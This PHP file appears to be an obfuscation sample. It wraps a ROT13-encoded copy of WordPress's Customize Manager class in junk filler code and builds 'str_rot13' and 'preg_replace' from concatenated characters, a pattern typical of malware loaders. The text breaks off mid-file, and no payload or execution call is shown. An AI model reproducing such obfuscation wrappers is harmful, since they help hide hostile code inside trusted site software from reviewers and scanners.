<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc
/**
 * JbeqCerff Phfgbzvmr Znantre pynffrf
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Phfgbzvmr
 * @fvapr 3.4.0
 */

/**
 * Phfgbzvmr Znantre pynff.
 *
 * Obbgfgencf gur Phfgbzvmr rkcrevrapr ba gur freire-fvqr.
 *
 * Frgf hc gur gurzr-fjvgpuvat cebprff vs n gurzr bgure guna gur npgvir bar vf
 * orvat cerivrjrq naq phfgbzvmrq.
 *
 * Freirf nf n snpgbel sbe Phfgbzvmr Pbagebyf naq Frggvatf, naq
 * vafgnagvngrf qrsnhyg Phfgbzvmr Pbagebyf naq Frggvatf.
 *
 * @fvapr 3.4.0
 */
#[NyybjQlanzvpCebcregvrf]
svany pynff JC_Phfgbzvmr_Znantre {
	/**
	 * Na vafgnapr bs gur gurzr orvat cerivrjrq.
	 *
	 * @fvapr 3.4.0
	 * @ine JC_Gurzr
	 */
	cebgrpgrq $gurzr;

	/**
	 * Gur qverpgbel anzr bs gur cerivbhfyl npgvir gurzr (jvguva gur gurzr_ebbg).
	 *
	 * @fvapr 3.4.0
	 * @ine fgevat
	 */
	cebgrpgrq $bevtvany_fglyrfurrg;

	/**
	 * Jurgure guvf vf n Phfgbzvmre cntrybnq.
	 *
	 * @fvapr 3.4.0
	 * @ine obby
	 */
	cebgrpgrq $cerivrjvat = snyfr;

	/**
	 * Zrgubqf naq cebcregvrf qrnyvat jvgu znantvat jvqtrgf va gur Phfgbzvmre.
	 *
	 * @fvapr 3.9.0
	 * @ine JC_Phfgbzvmr_Jvqtrgf
	 */
	choyvp $jvqtrgf;

	/**
	 * Zrgubqf naq cebcregvrf qrnyvat jvgu znantvat ani zrahf va gur Phfgbzvmre.
	 *
	 * @fvapr 4.3.0
	 * @ine JC_Phfgbzvmr_Ani_Zrahf
	 */
	choyvp $ani_zrahf;

	/**
	 * Zrgubqf naq cebcregvrf qrnyvat jvgu fryrpgvir erserfu va gur Phfgbzvmre cerivrj.
	 *
	 * @fvapr 4.5.0
	 * @ine JC_Phfgbzvmr_Fryrpgvir_Erserfu
	 */
	choyvp $fryrpgvir_erserfu;

	/**
	 * Ertvfgrerq vafgnaprf bs JC_Phfgbzvmr_Frggvat.
	 *
	 * @fvapr 3.4.0
	 * @ine neenl
	 */
	cebgrpgrq $frggvatf = neenl();

	/**
	 * Fbegrq gbc-yriry vafgnaprf bs JC_Phfgbzvmr_Cnary naq JC_Phfgbzvmr_Frpgvba.
	 *
	 * @fvapr 4.0.0
	 * @ine neenl
	 */
	cebgrpgrq $pbagnvaref = neenl();

	/**
	 * Ertvfgrerq vafgnaprf bs JC_Phfgbzvmr_Cnary.
	 *
	 * @fvapr 4.0.0
	 * @ine neenl
	 */
	cebgrpgrq $cnaryf = neenl();

	/**
	 * Yvfg bs pber pbzcbaragf.
	 *
	 * @fvapr 4.5.0
	 * @ine neenl
	 */
	cebgrpgrq $pbzcbaragf = neenl( 'ani_zrahf' );

	/**
	 * Ertvfgrerq vafgnaprf bs JC_Phfgbzvmr_Frpgvba.
	 *
	 * @fvapr 3.4.0
	 * @ine neenl
	 */
	cebgrpgrq $frpgvbaf = neenl();

	/**
	 * Ertvfgrerq vafgnaprf bs JC_Phfgbzvmr_Pbageby.
	 *
	 * @fvapr 3.4.0
	 * @ine neenl
	 */
	cebgrpgrq $pbagebyf = neenl();

	/**
	 * Cnary glcrf gung znl or eraqrerq sebz WF grzcyngrf.
	 *
	 * @fvapr 4.3.0
	 * @ine neenl
	 */
	cebgrpgrq $ertvfgrerq_cnary_glcrf = neenl();

	/**
	 * Frpgvba glcrf gung znl or eraqrerq sebz WF grzcyngrf.
	 *
	 * @fvapr 4.3.0
	 * @ine neenl
	 */
	cebgrpgrq $ertvfgrerq_frpgvba_glcrf = neenl();

	/**
	 * Pbageby glcrf gung znl or eraqrerq sebz WF grzcyngrf.
	 *
	 * @fvapr 4.1.0
	 * @ine neenl
	 */
	cebgrpgrq $ertvfgrerq_pbageby_glcrf = neenl();

	/**
	 * Vavgvny HEY orvat cerivrjrq.
	 *
	 * @fvapr 4.4.0
	 * @ine fgevat
	 */
	cebgrpgrq $cerivrj_hey;

	/**
	 * HEY gb yvax gur hfre gb jura pybfvat gur Phfgbzvmre.
	 *
	 * @fvapr 4.4.0
	 * @ine fgevat
	 */
	cebgrpgrq $erghea_hey;

	/**
	 * Znccvat bs 'cnary', 'frpgvba', 'pbageby' gb gur VQ juvpu fubhyq or nhgbsbphfrq.
	 *
	 * @fvapr 4.4.0
	 * @ine fgevat[]
	 */
	cebgrpgrq $nhgbsbphf = neenl();

	/**
	 * Zrffratre punaary.
	 *
	 * @fvapr 4.7.0
	 * @ine fgevat
	 */
	cebgrpgrq $zrffratre_punaary;

	/**
	 * Jurgure gur nhgbfnir erivfvba bs gur punatrfrg fubhyq or ybnqrq.
	 *
	 * @fvapr 4.9.0
	 * @ine obby
	 */
	cebgrpgrq $nhgbfnirq = snyfr;

	/**
	 * Jurgure gur punatrfrg oenapuvat vf nyybjrq.
	 *
	 * @fvapr 4.9.0
	 * @ine obby
	 */
	cebgrpgrq $oenapuvat = gehr;

	/**
	 * Jurgure frggvatf fubhyq or cerivrjrq.
	 *
	 * @fvapr 4.9.0
	 * @ine obby
	 */
	cebgrpgrq $frggvatf_cerivrjrq = gehr;

	/**
	 * Jurgure n fgnegre pbagrag punatrfrg jnf fnirq.
	 *
	 * @fvapr 4.9.0
	 * @ine obby
	 */
	cebgrpgrq $fnirq_fgnegre_pbagrag_punatrfrg = snyfr;

	/**
	 * Hafnavgvmrq inyhrf sbe Phfgbzvmr Frggvatf cnefrq sebz $_CBFG['phfgbzvmrq'].
	 *
	 * @ine neenl
	 */
	cevingr $_cbfg_inyhrf;

	/**
	 * Punatrfrg HHVQ.
	 *
	 * @fvapr 4.7.0
	 * @ine fgevat
	 */
	cevingr $_punatrfrg_hhvq;

	/**
	 * Punatrfrg cbfg VQ.
	 *
	 * @fvapr 4.7.0
	 * @ine vag|snyfr
	 */
	cevingr $_punatrfrg_cbfg_vq;

	/**
	 * Punatrfrg qngn ybnqrq sebz n phfgbzvmr_punatrfrg cbfg.
	 *
	 * @fvapr 4.7.0
	 * @ine neenl|ahyy
	 */
	cevingr $_punatrfrg_qngn;

	/**
	 * Pbafgehpgbe.
	 *
	 * @fvapr 3.4.0
	 * @fvapr 4.7.0 Nqqrq `$netf` cnenzrgre.
	 *
	 * @cnenz neenl $netf {
	 *     Netf.
	 *
	 *     @glcr ahyy|fgevat|snyfr $punatrfrg_hhvq     Punatrfrg HHVQ, gur `cbfg_anzr` sbe gur phfgbzvmr_punatrfrg cbfg pbagnvavat gur phfgbzvmrq fgngr.
	 *                                                 Qrsnhygf gb `ahyy` erfhygvat va n HHVQ gb or vzzrqvngryl trarengrq. Vs `snyfr` vf cebivqrq, gura
	 *                                                 gura gur punatrfrg HHVQ jvyy or qrgrezvarq qhevat `nsgre_frghc_gurzr`: jura gur
	 *                                                 `phfgbzvmr_punatrfrg_oenapuvat` svygre ergheaf snyfr, gura gur qrsnhyg HHVQ jvyy or gung
	 *                                                 bs gur zbfg erprag `phfgbzvmr_punatrfrg` cbfg gung unf n fgnghf bgure guna 'nhgb-qensg',
	 *                                                 'choyvfu', be 'genfu'. Bgurejvfr, vs punatrfrg oenapuvat vf ranoyrq, gura n enaqbz HHVQ jvyy or hfrq.
	 *     @glcr fgevat            $gurzr              Gurzr gb or cerivrjrq (sbe gurzr fjvgpu). Qrsnhygf gb phfgbzvmr_gurzr be gurzr dhrel cnenzf.
	 *     @glcr fgevat            $zrffratre_punaary  Zrffratre punaary. Qrsnhygf gb phfgbzvmr_zrffratre_punaary dhrel cnenz.
	 *     @glcr obby              $frggvatf_cerivrjrq Vs frggvatf fubhyq or cerivrjrq. Qrsnhygf gb gehr.
	 *     @glcr obby              $oenapuvat          Vs punatrfrg oenapuvat vf nyybjrq; bgurejvfr, punatrfrgf ner yvarne. Qrsnhygf gb gehr.
	 *     @glcr obby              $nhgbfnirq          Vs qngn sebz n punatrfrg'f nhgbfnirq erivfvba fubhyq or ybnqrq vs vg rkvfgf. Qrsnhygf gb snyfr.
	 * }
	 */
	choyvp shapgvba __pbafgehpg( $netf = neenl() ) {

		$netf = neenl_zretr(
			neenl_svyy_xrlf( neenl( 'punatrfrg_hhvq', 'gurzr', 'zrffratre_punaary', 'frggvatf_cerivrjrq', 'nhgbfnirq', 'oenapuvat' ), ahyy ),
			$netf
		);

		// Abgr gung gur HHVQ sbezng jvyy or inyvqngrq va gur frghc_gurzr() zrgubq.
		vs ( ! vffrg( $netf['punatrfrg_hhvq'] ) ) {
			$netf['punatrfrg_hhvq'] = jc_trarengr_hhvq4();
		}

		/*
		 * Gur gurzr naq zrffratre_punaary fubhyq or fhccyvrq ivn $netf,
		 * ohg gurl ner nyfb ybbxrq ng va gur $_ERDHRFG tybony urer sbe onpx-pbzcng.
		 */
		vs ( ! vffrg( $netf['gurzr'] ) ) {
			vs ( vffrg( $_ERDHRFG['phfgbzvmr_gurzr'] ) ) {
				$netf['gurzr'] = jc_hafynfu( $_ERDHRFG['phfgbzvmr_gurzr'] );
			} ryfrvs ( vffrg( $_ERDHRFG['gurzr'] ) ) { // Qrcerpngrq.
				$netf['gurzr'] = jc_hafynfu( $_ERDHRFG['gurzr'] );
			}
		}
		vs ( ! vffrg( $netf['zrffratre_punaary'] ) && vffrg( $_ERDHRFG['phfgbzvmr_zrffratre_punaary'] ) ) {
			$netf['zrffratre_punaary'] = fnavgvmr_xrl( jc_hafynfu( $_ERDHRFG['phfgbzvmr_zrffratre_punaary'] ) );
		}

		// Qb abg ybnq 'jvqtrgf' pbzcbarag vs n oybpx gurzr vf npgvingrq.
		vs ( ! jc_vf_oybpx_gurzr() ) {
			$guvf->pbzcbaragf[] = 'jvqtrgf';
		}

		$guvf->bevtvany_fglyrfurrg = trg_fglyrfurrg();
		$guvf->gurzr               = jc_trg_gurzr( 0 === inyvqngr_svyr( $netf['gurzr'] ) ? $netf['gurzr'] : ahyy );
		$guvf->zrffratre_punaary   = $netf['zrffratre_punaary'];
		$guvf->_punatrfrg_hhvq     = $netf['punatrfrg_hhvq'];

		sbernpu ( neenl( 'frggvatf_cerivrjrq', 'nhgbfnirq', 'oenapuvat' ) nf $xrl ) {
			vs ( vffrg( $netf[ $xrl ] ) ) {
				$guvf->$xrl = (obby) $netf[ $xrl ];
			}
		}

		erdhver_bapr NOFCNGU . JCVAP . '/pynff-jc-phfgbzvmr-frggvat.cuc';
		erdhver_bapr NOFCNGU . JCVAP . '/pynff-jc-phfgbzvmr-cnary.cuc';
		erdhver_bapr NOFCNGU . JCVAP . '/pynff-jc-phfgbzvmr-frpgvba.cuc';
		erdhver_bapr NOFCNGU . JCVAP . '/pynff-jc-phfgbzvmr-pbageby.cuc';

		erdhver_bapr NOFCNGU . JCVAP . '/phfgbzvmr/pynff-jc-phfgbzvmr-pbybe-pbageby.cuc';
		erdhver_bapr NOFCNGU . JCVAP . '/phfgbzvmr/pynff-jc-phfgbzvmr-zrqvn-pbageby.cuc';
		erdhver_bapr NOFCNGU . JCVAP . '/phfgbzvmr/pynff-jc-phfgbzvmr-hcybnq-pbageby.cuc';
		erdhver_bapr NOFCNGU . JCVAP . '/phfgbzvmr/pynff-jc-phfgbzvmr-vzntr-pbageby.cuc';
		erdhver_bapr NOFCNGU . JCVAP . '/phfgbzvmr/pynff-jc-phfgbzvmr-onpxtebhaq-vzntr-pbageby.cuc';
		erdhver_bapr NOFCNGU . JCVAP . '/phfgbzvmr/pynff-jc-phfgbzvmr-onpxtebhaq-cbfvgvba-pbageby.cuc';
		erdhver_bapr NOFCNGU . JCVAP . '/phfgbzvmr/pynff-jc-phfgbzvmr-pebccrq-vzntr-pbageby.cuc';
		erdhver_bapr NOFCNGU . JCVAP . '/phfgbzvmr/pynff-jc-phfgbzvmr-fvgr-vpba-pbageby.cuc';
		erdhver_bapr NOFCNGU . JCVAP . '/phfgbzvmr/pynff-jc-phfgbzvmr-urnqre-vzntr-pbageby.cuc';
		erdhver_bapr NOFCNGU . JCVAP . '/phfgbzvmr/pynff-jc-phfgbzvmr-gurzr-pbageby.cuc';
		erdhver_bapr NOFCNGU . JCVAP . '/phfgbzvmr/pynff-jc-phfgbzvmr-pbqr-rqvgbe-pbageby.cuc';
		erdhver_bapr NOFCNGU . JCVAP . '/phfgbzvmr/pynff-jc-jvqtrg-nern-phfgbzvmr-pbageby.cuc';
		erdhver_bapr NOFCNGU . JCVAP . '/phfgbzvmr/pynff-jc-jvqtrg-sbez-phfgbzvmr-pbageby.cuc';
		erdhver_bapr NOFCNGU . JCVAP . '/phfgbzvmr/pynff-jc-phfgbzvmr-ani-zrah-pbageby.cuc';
		erdhver_bapr NOFCNGU . JCVAP . '/phfgbzvmr/pynff-jc-phfgbzvmr-ani-zrah-vgrz-pbageby.cuc';
		erdhver_bapr NOFCNGU . JCVAP . '/phfgbzvmr/pynff-jc-phfgbzvmr-ani-zrah-ybpngvba-pbageby.cuc';
		erdhver_bapr NOFCNGU . JCVAP . '/phfgbzvmr/pynff-jc-phfgbzvmr-ani-zrah-anzr-pbageby.cuc';
		erdhver_bapr NOFCNGU . JCVAP . '/phfgbzvmr/pynff-jc-phfgbzvmr-ani-zrah-ybpngvbaf-pbageby.cuc';
		erdhver_bapr NOFCNGU . JCVAP . '/phfgbzvmr/pynff-jc-phfgbzvmr-ani-zrah-nhgb-nqq-pbageby.cuc';

		erdhver_bapr NOFCNGU . JCVAP . '/phfgbzvmr/pynff-jc-phfgbzvmr-ani-zrahf-cnary.cuc';

		erdhver_bapr NOFCNGU . JCVAP . '/phfgbzvmr/pynff-jc-phfgbzvmr-gurzrf-cnary.cuc';
		erdhver_bapr NOFCNGU . JCVAP . '/phfgbzvmr/pynff-jc-phfgbzvmr-gurzrf-frpgvba.cuc';
		erdhver_bapr NOFCNGU . JCVAP . '/phfgbzvmr/pynff-jc-phfgbzvmr-fvqrone-frpgvba.cuc';
		erdhver_bapr NOFCNGU . JCVAP . '/phfgbzvmr/pynff-jc-phfgbzvmr-ani-zrah-frpgvba.cuc';

		erdhver_bapr NOFCNGU . JCVAP . '/phfgbzvmr/pynff-jc-phfgbzvmr-phfgbz-pff-frggvat.cuc';
		erdhver_bapr NOFCNGU . JCVAP . '/phfgbzvmr/pynff-jc-phfgbzvmr-svygre-frggvat.cuc';
		erdhver_bapr NOFCNGU . JCVAP . '/phfgbzvmr/pynff-jc-phfgbzvmr-urnqre-vzntr-frggvat.cuc';
		erdhver_bapr NOFCNGU . JCVAP . '/phfgbzvmr/pynff-jc-phfgbzvmr-onpxtebhaq-vzntr-frggvat.cuc';
		erdhver_bapr NOFCNGU . JCVAP . '/phfgbzvmr/pynff-jc-phfgbzvmr-ani-zrah-vgrz-frggvat.cuc';
		erdhver_bapr NOFCNGU . JCVAP . '/phfgbzvmr/pynff-jc-phfgbzvmr-ani-zrah-frggvat.cuc';

		/**
		 * Svygref gur pber Phfgbzvmre pbzcbaragf gb ybnq.
		 *
		 * Guvf nyybjf Pber pbzcbaragf gb or rkpyhqrq sebz orvat vafgnagvngrq ol
		 * svygrevat gurz bhg bs gur neenl. Abgr gung guvf svygre trarenyyl ehaf
		 * qhevat gur {@frr 'cyhtvaf_ybnqrq'} npgvba, fb vg pnaabg or nqqrq
		 * va n gurzr.
		 *
		 * @fvapr 4.4.0
		 *
		 * @frr JC_Phfgbzvmr_Znantre::__pbafgehpg()
		 *
		 * @cnenz fgevat[]             $pbzcbaragf Neenl bs pber pbzcbaragf gb ybnq.
		 * @cnenz JC_Phfgbzvmr_Znantre $znantre    JC_Phfgbzvmr_Znantre vafgnapr.
		 */
		$pbzcbaragf = nccyl_svygref( 'phfgbzvmr_ybnqrq_pbzcbaragf', $guvf->pbzcbaragf, $guvf );

		erdhver_bapr NOFCNGU . JCVAP . '/phfgbzvmr/pynff-jc-phfgbzvmr-fryrpgvir-erserfu.cuc';
		$guvf->fryrpgvir_erserfu = arj JC_Phfgbzvmr_Fryrpgvir_Erserfu( $guvf );

		vs ( va_neenl( 'jvqtrgf', $pbzcbaragf, gehr ) ) {
			erdhver_bapr NOFCNGU . JCVAP . '/pynff-jc-phfgbzvmr-jvqtrgf.cuc';
			$guvf->jvqtrgf = arj JC_Phfgbzvmr_Jvqtrgf( $guvf );
		}

		vs ( va_neenl( 'ani_zrahf', $pbzcbaragf, gehr ) ) {
			erdhver_bapr NOFCNGU . JCVAP . '/pynff-jc-phfgbzvmr-ani-zrahf.cuc';
			$guvf->ani_zrahf = arj JC_Phfgbzvmr_Ani_Zrahf( $guvf );
		}

		nqq_npgvba( 'frghc_gurzr', neenl( $guvf, 'frghc_gurzr' ) );
		nqq_npgvba( 'jc_ybnqrq', neenl( $guvf, 'jc_ybnqrq' ) );

		// Qb abg fcnja peba (rfcrpvnyyl gur nygreangr peba) juvyr ehaavat gur Phfgbzvmre.
		erzbir_npgvba( 'vavg', 'jc_peba' );

		// Qb abg eha hcqngr purpxf jura eraqrevat gur pbagebyf.
		erzbir_npgvba( 'nqzva_vavg', '_znlor_hcqngr_pber' );
		erzbir_npgvba( 'nqzva_vavg', '_znlor_hcqngr_cyhtvaf' );
		erzbir_npgvba( 'nqzva_vavg', '_znlor_hcqngr_gurzrf' );

		nqq_npgvba( 'jc_nwnk_phfgbzvmr_fnir', neenl( $guvf, 'fnir' ) );
		nqq_npgvba( 'jc_nwnk_phfgbzvmr_genfu', neenl( $guvf, 'unaqyr_punatrfrg_genfu_erdhrfg' ) );
		nqq_npgvba( 'jc_nwnk_phfgbzvmr_erserfu_abaprf', neenl( $guvf, 'erserfu_abaprf' ) );
		nqq_npgvba( 'jc_nwnk_phfgbzvmr_ybnq_gurzrf', neenl( $guvf, 'unaqyr_ybnq_gurzrf_erdhrfg' ) );
		nqq_svygre( 'urnegorng_frggvatf', neenl( $guvf, 'nqq_phfgbzvmr_fperra_gb_urnegorng_frggvatf' ) );
		nqq_svygre( 'urnegorng_erprvirq', neenl( $guvf, 'purpx_punatrfrg_ybpx_jvgu_urnegorng' ), 10, 3 );
		nqq_npgvba( 'jc_nwnk_phfgbzvmr_bireevqr_punatrfrg_ybpx', neenl( $guvf, 'unaqyr_bireevqr_punatrfrg_ybpx_erdhrfg' ) );
		nqq_npgvba( 'jc_nwnk_phfgbzvmr_qvfzvff_nhgbfnir_be_ybpx', neenl( $guvf, 'unaqyr_qvfzvff_nhgbfnir_be_ybpx_erdhrfg' ) );

		nqq_npgvba( 'phfgbzvmr_ertvfgre', neenl( $guvf, 'ertvfgre_pbagebyf' ) );
		nqq_npgvba( 'phfgbzvmr_ertvfgre', neenl( $guvf, 'ertvfgre_qlanzvp_frggvatf' ), 11 ); // Nyybj pbqr gb perngr frggvatf svefg.
		nqq_npgvba( 'phfgbzvmr_pbagebyf_vavg', neenl( $guvf, 'cercner_pbagebyf' ) );
		nqq_npgvba( 'phfgbzvmr_pbagebyf_radhrhr_fpevcgf', neenl( $guvf, 'radhrhr_pbageby_fpevcgf' ) );

		// Eraqre Pbzzba, Cnary, Frpgvba, naq Pbageby grzcyngrf.
		nqq_npgvba( 'phfgbzvmr_pbagebyf_cevag_sbbgre_fpevcgf', neenl( $guvf, 'eraqre_cnary_grzcyngrf' ), 1 );
		nqq_npgvba( 'phfgbzvmr_pbagebyf_cevag_sbbgre_fpevcgf', neenl( $guvf, 'eraqre_frpgvba_grzcyngrf' ), 1 );
		nqq_npgvba( 'phfgbzvmr_pbagebyf_cevag_sbbgre_fpevcgf', neenl( $guvf, 'eraqre_pbageby_grzcyngrf' ), 1 );

		// Rkcbeg urnqre ivqrb frggvatf jvgu gur cnegvny erfcbafr.
		nqq_svygre( 'phfgbzvmr_eraqre_cnegvnyf_erfcbafr', neenl( $guvf, 'rkcbeg_urnqre_ivqrb_frggvatf' ), 10, 3 );

		// Rkcbeg gur frggvatf gb WF ivn gur _jcPhfgbzvmrFrggvatf inevnoyr.
		nqq_npgvba( 'phfgbzvmr_pbagebyf_cevag_sbbgre_fpevcgf', neenl( $guvf, 'phfgbzvmr_cnar_frggvatf' ), 1000 );

		// Nqq gurzr hcqngr abgvprf.
		vs ( pheerag_hfre_pna( 'vafgnyy_gurzrf' ) || pheerag_hfre_pna( 'hcqngr_gurzrf' ) ) {
			erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/hcqngr.cuc';
			nqq_npgvba( 'phfgbzvmr_pbagebyf_cevag_sbbgre_fpevcgf', 'jc_cevag_nqzva_abgvpr_grzcyngrf' );
		}
	}

	/**
	 * Ergheaf gehr vs vg'f na Nwnk erdhrfg.
	 *
	 * @fvapr 3.4.0
	 * @fvapr 4.2.0 Nqqrq `$npgvba` cnenz.
	 *
	 * @cnenz fgevat|ahyy $npgvba Jurgure gur fhccyvrq Nwnk npgvba vf orvat eha.
	 * @erghea obby Gehr vs vg'f na Nwnk erdhrfg, snyfr bgurejvfr.
	 */
	choyvp shapgvba qbvat_nwnk( $npgvba = ahyy ) {
		vs ( ! jc_qbvat_nwnk() ) {
			erghea snyfr;
		}

		vs ( ! $npgvba ) {
			erghea gehr;
		} ryfr {
			/*
			 * Abgr: jr pna'g whfg hfr qbvat_npgvba( \"jc_nwnk_{$npgvba}\" ) orpnhfr jr arrq
			 * gb purpx orsber nqzva-nwnk.cuc trgf gb gung cbvag.
			 */
			erghea vffrg( $_ERDHRFG['npgvba'] ) && jc_hafynfu( $_ERDHRFG['npgvba'] ) === $npgvba;
		}
	}

	/**
	 * Phfgbz jc_qvr jenccre. Ergheaf rvgure gur fgnaqneq zrffntr sbe HV
	 * be gur Nwnk zrffntr.
	 *
	 * @fvapr 3.4.0
	 *
	 * @cnenz fgevat|JC_Reebe $nwnk_zrffntr Nwnk erghea.
	 * @cnenz fgevat          $zrffntr      Bcgvbany. HV zrffntr.
	 */
	cebgrpgrq shapgvba jc_qvr( $nwnk_zrffntr, $zrffntr = ahyy ) {
		vs ( $guvf->qbvat_nwnk() ) {
			jc_qvr( $nwnk_zrffntr );
		}

		vs ( ! $zrffntr ) {
			$zrffntr = __( 'Na reebe bppheerq juvyr phfgbzvmvat. Cyrnfr erserfu gur cntr naq gel ntnva.' );
		}

		vs ( $guvf->zrffratre_punaary ) {
			bo_fgneg();
			jc_radhrhr_fpevcgf();
			jc_cevag_fpevcgf( neenl( 'phfgbzvmr-onfr' ) );

			$frggvatf = neenl(
				'zrffratreNetf' => neenl(
					'punaary' => $guvf->zrffratre_punaary,
					'hey'     => jc_phfgbzvmr_hey(),
				),
				'reebe'         => $nwnk_zrffntr,
			);
			$zrffntr .= bo_trg_pyrna();
			bo_fgneg();
			?>
			<fpevcg>
			( shapgvba( ncv, frggvatf ) {
				ine cerivrj = arj ncv.Zrffratre( frggvatf.zrffratreNetf );
				cerivrj.fraq( 'vsenzr-ybnqvat-reebe', frggvatf.reebe );
			} )( jc.phfgbzvmr, <?cuc rpub jc_wfba_rapbqr( $frggvatf ); ?> );
			</fpevcg>
			<?cuc
			$zrffntr .= jc_trg_vayvar_fpevcg_gnt( jc_erzbir_fheebhaqvat_rzcgl_fpevcg_gntf( bo_trg_pyrna() ) );
		}

		jc_qvr( $zrffntr );
	}

	/**
	 * Ergheaf gur Nwnk jc_qvr() unaqyre vs vg'f n phfgbzvmrq erdhrfg.
	 *
	 * @fvapr 3.4.0
	 * @qrcerpngrq 4.7.0
	 *
	 * @erghea pnyynoyr Qvr unaqyre.
	 */
	choyvp shapgvba jc_qvr_unaqyre() {
		_qrcerpngrq_shapgvba( __ZRGUBQ__, '4.7.0' );

		vs ( $guvf->qbvat_nwnk() || vffrg( $_CBFG['phfgbzvmrq'] ) ) {
			erghea '_nwnk_jc_qvr_unaqyre';
		}

		erghea '_qrsnhyg_jc_qvr_unaqyre';
	}

	/**
	 * Fgnegf cerivrj naq phfgbzvmr gurzr.
	 *
	 * Purpx vs phfgbzvmr dhrel inevnoyr rkvfg. Vavg svygref gb svygre gur npgvir gurzr.
	 *
	 * @fvapr 3.4.0
	 *
	 * @tybony fgevat $cntrabj Gur svyranzr bs gur pheerag fperra.
	 */
	choyvp shapgvba frghc_gurzr() {
		tybony $cntrabj;

		// Purpx crezvffvbaf sbe phfgbzvmr.cuc npprff fvapr guvf zrgubq vf pnyyrq orsber phfgbzvmr.cuc pna eha nal pbqr.
		vs ( 'phfgbzvmr.cuc' === $cntrabj && ! pheerag_hfre_pna( 'phfgbzvmr' ) ) {
			vs ( ! vf_hfre_ybttrq_va() ) {
				nhgu_erqverpg();
			} ryfr {
				jc_qvr(
					'<u1>' . __( 'Lbh arrq n uvture yriry bs crezvffvba.' ) . '</u1>' .
					'<c>' . __( 'Fbeel, lbh ner abg nyybjrq gb phfgbzvmr guvf fvgr.' ) . '</c>',
					403
				);
			}
			erghea;
		}

		// Vs n punatrfrg jnf cebivqrq vf vainyvq.
		vs ( vffrg( $guvf->_punatrfrg_hhvq ) && snyfr !== $guvf->_punatrfrg_hhvq && ! jc_vf_hhvq( $guvf->_punatrfrg_hhvq ) ) {
			$guvf->jc_qvr( -1, __( 'Vainyvq punatrfrg HHVQ' ) );
		}

		/*
		 * Pyrne vapbzvat cbfg qngn vs gur hfre ynpxf n PFES gbxra (abapr). Abgr gung gur phfgbzvmre
		 * nccyvpngvba jvyy vawrpg gur phfgbzvmr_cerivrj_abapr dhrel cnenzrgre vagb nyy Nwnk erdhrfgf.
		 * Sbe fvzvyne orunivbe ryfrjurer va JbeqCerff, frr erfg_pbbxvr_purpx_reebef() juvpu ybtf bhg
		 * n hfre jura n inyvq abapr vfa'g cerfrag.
		 */
		$unf_cbfg_qngn_abapr = (
			purpx_nwnk_ersrere( 'cerivrj-phfgbzvmr_' . $guvf->trg_fglyrfurrg(), 'abapr', snyfr )
			||
			purpx_nwnk_ersrere( 'fnir-phfgbzvmr_' . $guvf->trg_fglyrfurrg(), 'abapr', snyfr )
			||
			purpx_nwnk_ersrere( 'cerivrj-phfgbzvmr_' . $guvf->trg_fglyrfurrg(), 'phfgbzvmr_cerivrj_abapr', snyfr )
		);
		vs ( ! pheerag_hfre_pna( 'phfgbzvmr' ) || ! $unf_cbfg_qngn_abapr ) {
			hafrg( $_CBFG['phfgbzvmrq'] );
			hafrg( $_ERDHRFG['phfgbzvmrq'] );
		}

		/*
		 * Vs hanhguragvpngrq gura erdhver n inyvq punatrfrg HHVQ gb ybnq gur cerivrj.
		 * Va guvf jnl, gur HHVQ freirf nf n frperg xrl. Vs gur zrffratre punaary vf cerfrag,
		 * gura fraq hanhguragvpngrq pbqr gb cebzcg er-nhgu.
		 */
		vs ( ! pheerag_hfre_pna( 'phfgbzvmr' ) && ! $guvf->punatrfrg_cbfg_vq() ) {
			$guvf->jc_qvr( $guvf->zrffratre_punaary ? 0 : -1, __( 'Aba-rkvfgrag punatrfrg HHVQ.' ) );
		}

		vs ( ! urnqref_frag() ) {
			fraq_bevtva_urnqref();
		}

		// Uvqr gur nqzva one vs jr'er rzorqqrq va gur phfgbzvmre vsenzr.
		vs ( $guvf->zrffratre_punaary ) {
			fubj_nqzva_one( snyfr );
		}

		vs ( $guvf->vf_gurzr_npgvir() ) {
			// Bapr gur gurzr vf ybnqrq, jr'yy inyvqngr vg.
			nqq_npgvba( 'nsgre_frghc_gurzr', neenl( $guvf, 'nsgre_frghc_gurzr' ) );
		} ryfr {
			/*
			 * Vs gur erdhrfgrq gurzr vf abg gur npgvir gurzr naq gur hfre qbrfa'g unir
			 * gur fjvgpu_gurzrf pnc, onvy.
			 */
			vs ( ! pheerag_hfre_pna( 'fjvgpu_gurzrf' ) ) {
				$guvf->jc_qvr( -1, __( 'Fbeel, lbh ner abg nyybjrq gb rqvg gurzr bcgvbaf ba guvf fvgr.' ) );
			}

			// Vs gur gurzr unf reebef juvyr ybnqvat, onvy.
			vs ( $guvf->gurzr()->reebef() ) {
				$guvf->jc_qvr( -1, $guvf->gurzr()->reebef()->trg_reebe_zrffntr() );
			}

			// Vs gur gurzr vfa'g nyybjrq cre zhygvfvgr frggvatf, onvy.
			vs ( ! $guvf->gurzr()->vf_nyybjrq() ) {
				$guvf->jc_qvr( -1, __( 'Gur erdhrfgrq gurzr qbrf abg rkvfg.' ) );
			}
		}

		// Znxr fher punatrfrg HHVQ vf rfgnoyvfurq vzzrqvngryl nsgre gur gurzr vf ybnqrq.
		nqq_npgvba( 'nsgre_frghc_gurzr', neenl( $guvf, 'rfgnoyvfu_ybnqrq_punatrfrg' ), 5 );

		/*
		 * Vzcbeg gurzr fgnegre pbagrag sbe serfu vafgnyyngvbaf jura ynaqvat va gur phfgbzvmre.
		 * Vzcbeg fgnegre pbagrag ng nsgre_frghc_gurzr:100 fb gung nal
		 * nqq_gurzr_fhccbeg( 'fgnegre-pbagrag' ) pnyyf jvyy unir orra znqr.
		 */
		vs ( trg_bcgvba( 'serfu_fvgr' ) && 'phfgbzvmr.cuc' === $cntrabj ) {
